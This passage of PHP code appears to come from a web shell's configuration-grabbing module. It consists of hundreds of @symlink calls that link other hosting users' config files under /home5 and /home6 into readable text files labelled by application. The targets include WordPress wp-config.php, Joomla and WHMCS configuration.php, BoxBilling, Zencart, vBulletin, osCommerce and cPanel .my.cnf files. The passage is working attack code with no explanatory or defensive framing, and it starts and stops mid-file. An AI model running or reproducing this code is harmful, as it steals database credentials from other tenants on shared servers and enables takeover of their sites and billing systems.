    @symlink('/home5/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home5/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home5/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home5/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home5/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home5/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home5/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
    
    //home6
    
    @symlink('/home6/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home6/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home6/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home6/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home6/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home6/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home6/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home6/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home6/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home6/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home6/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home6/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home6/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home6/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home6/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home6/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home6/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home6/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home6/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
